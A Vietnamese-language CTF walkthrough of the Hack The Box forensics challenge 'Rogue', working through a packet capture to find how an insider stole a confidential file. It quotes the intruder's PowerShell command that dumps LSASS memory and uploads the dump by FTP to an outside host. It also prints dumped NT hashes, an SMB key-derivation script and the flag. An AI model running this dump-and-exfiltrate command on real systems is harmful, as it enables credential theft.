## Description
> SecCorp has reached us about a recent cyber security incident. They are confident that a malicious entity has managed to access a shared folder that stores confidential files. Our threat intel informed us about an active dark web forum where disgruntled employees offer to give access to their employer's internal network for a financial reward. In this forum, one of SecCorp's employees offers to provide access to a low-privileged domain-joined user for 10K in cryptocurrency. Your task is to find out how they managed to gain access to the folder and what corporate secrets did they steal.

## Link challenge 
> https://app.hackthebox.com/challenges/Rogue
## Solution 

- Nhìn vào đề bài và challenge cho ta 1 file pcapng, đầu tiên ta xem chúng sử dụng những giao thức nào
- ![aa](image/50.png)
- Ta thấy rằng chúng sử dụng giao thức ftp, có thể giao thức này được sử dụng để di chuyển tệp và đánh cắp thông tin
- Vì giao thức SMB đã bị mã hoá nên ta bắt đầu phân tích giao thức FTP trước
```
220 (vsFTPd 3.0.3)
USER ftpuser
331 Please specify the password.
PASS SZC0aBomFG
230 Login successful.
OPTS utf8 on
200 Always in UTF8 mode.
PWD
257 "/" is the current directory
TYPE I
200 Switching to Binary mode.
PASV
227 Entering Passive Mode (77,74,198,52,226,112).
STOR 3858793632.zip
150 Ok to send data.
226 Transfer complete.
```
- Ta thấy sau khi đăng nhập thì gửi file `3858793632.zip` đi, tuy nhiên khi mình extract từ export objects thì file không giải nén được vì dữ liệu bị thiếu. 
- Mình sẽ chuyển sang hướng lấy file trực tiếp từ luồng tcp
- ![ânnanan](image/51.png) 
- Sau khi giải nén ta được 1 file tên `3858793632.pmd`
- Để biết được file này là file gì ta theo dõi luồng tcp sẽ rõ
- Tại luồng tcp thứ 0 1 đoạn rev shell được tìm thấy
```
whoami
ws02\rpaker
PS C:\Windows\system32> hostname
ws02
PS C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
CORP\athomson
CORP\Domain Admins
rpaker
The command completed successfully.

PS C:\Windows\system32> Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\3858793632.pmd full | out-host; Compress-Archive  C:\windows\temp\3858793632.pmd  C:\windows\temp\3858793632.zip;Remove-Item -Path C:\windows\temp\3858793632.pmd -Force -ErrorAction Ignore;$cl = New-Object System.Net.WebClient;$f = "C:\windows\temp\3858793632.zip";$s = "ftp://ftpuser:SZC0aBomFG@windowsliveupdater.com/3858793632.zip";$u = New-Object System.Uri($s);$cl.UploadFile($u, $f);Remove-Item -Path C:\windows\temp\3858793632.zip -Force -ErrorAction Ignore;
PS C:\Windows\system32> exit
```
- Ở dưới ta thấy hacker tạo bản sao lưu tiến trình LSASS (MiniDump) vào file pmd sau đó nén thành tệp `3858793632.zip` và gửi thông qua ftp.
- Giờ thì ta đã biết file này là file gì rồi, sử dụng `pypykatz` để dump nó ra 

> pypykatz lsa minidump 3858793632.pmd

```
== LogonSession ==
authentication_id 6361112 (611018)
session_id 3
username rpaker
domainname WS02
logon_server WS02
logon_time 2022-07-04T11:37:24.798200+00:00
sid S-1-5-21-900241500-1566882183-2274020907-1001
luid 6361112
        == MSV ==
                Username: rpaker
                Domain: WS02
                LM: NA
                NT: a9fdfa038c4b75ebc76dc855dd74f0da
                SHA1: 9400ae28448e1364174dde269b2cce1bca9d7ee8
                DPAPI: NA
        == WDIGEST [611018]==
                username rpaker
                domainname WS02
                password None
                password (hex)
        == Kerberos ==
                Username: rpaker
                Domain: WS02
        == WDIGEST [611018]==
                username rpaker
                domainname WS02
                password None
                password (hex)
```
```
== LogonSession ==
authentication_id 3857660 (3adcfc)
session_id 2
username athomson
domainname CORP
logon_server CORP-DC
logon_time 2022-07-04T11:32:10.805162+00:00
sid S-1-5-21-288640240-4143160774-4193478011-1110
luid 3857660
        == MSV ==
                Username: athomson
                Domain: CORP
                LM: NA
                NT: 88d84bad705f61fcdea0d771301c3a7d
                SHA1: 60570041018a9e38fbee99a3e1f7bc18712018ba
                DPAPI: 022e4b6c4a40b4343b8371abbfa9a1a0
        == WDIGEST [3adcfc]==
                username athomson
                domainname CORP
                password None
                password (hex)
        == Kerberos ==
                Username: athomson
                Domain: CORP.LOCAL
        == WDIGEST [3adcfc]==
                username athomson
                domainname CORP
                password None
                password (hex)
        == DPAPI [3adcfc]==
                luid 3857660
                key_guid a61d49d1-5c3a-4849-8880-738ce6f8027b
                masterkey 00509f19c213842158ff61ac40bad16e395f7eaddc66d76e2c0e82d9803ee52bef5cd500e72ce5c261700b79832e3423ba117d88f8ae3eb71eb9c6216a3c223f
                sha1_masterkey 16f29541e8e3d010c0249048296c6b702a9bdc4d
```
- Sử dụng công cụ https://crackstation.net/ ta dễ dàng xác định được mật khẩu của rpaker là password123
- ![a](image/52.png)
- Tiếp theo ta sẽ tìm cách giải mã dữ liệu bị mã hoá của giao thức smb2
- Trước tiên ta phải trích xuất các dữ liệu liên quan để phù hợp với quá trình giải mã 
```
┌──(kali㉿kali)-[~/Downloads]
└─$ tshark -n -r capture.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid 
athomson        CORP    d047ccdffaeafb22f222e15e719a34d4        032c9ca4f6908be613b240062936e2d2        0x0000a00000000015
athomson        CORP    d09104b2ad7feed3c5e9c30dcb444553        28be9df22813cdfa83d25bf08b63049f        0x0000a00000000015
```

- Bây giờ mình sẽ sử dụng script này để trích xuất key decrypt. (NTHASH được lấy dữ liệu từ file pmd lúc nãy)

```
import hmac
from Crypto.Cipher import ARC4
from Crypto.Hash import MD5

# SESSION 0x0000a00000000015
USERNAME = 'athomson'
WORKGROUP = 'CORP'
NTHASH = bytes.fromhex('88d84bad705f61fcdea0d771301c3a7d')
NTPROOF = bytes.fromhex('d047ccdffaeafb22f222e15e719a34d4')
SESSKEY = bytes.fromhex('032c9ca4f6908be613b240062936e2d2')

ud = (USERNAME + WORKGROUP).upper().encode('UTF-16LE')
rknt = hmac.new(NTHASH, ud, MD5).digest()
kek = hmac.new(rknt, NTPROOF, MD5).digest()
rsk = ARC4.new(kek).decrypt(SESSKEY)
print("Decrypted SMB Session Key is:", rsk.hex())
```
- Kết quả là

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python rujn.py
Decrypted SMB Session Key is: 9ae0af5c19ba0de2ddbe70881d4263ac
```
- Ta có sesid là 0x0000a00000000015, ta sẽ chuyển về little-endian là 
1500000000A00000
- ![â](image/53.png)
- Giờ thì bỏ key và sesid vào wireshark để decrypt 
- ![a](image/54.png)
- ![aa](image/55.png)
- Ta thấy ở đây ta có 1 file pdf bị truyền đi, trích xuất nó ra ta có flag 
- ![aa](image/56.png)

> Flag : HTB{n0th1ng_c4n_st4y_un3ncrypt3d_f0r3v3r}
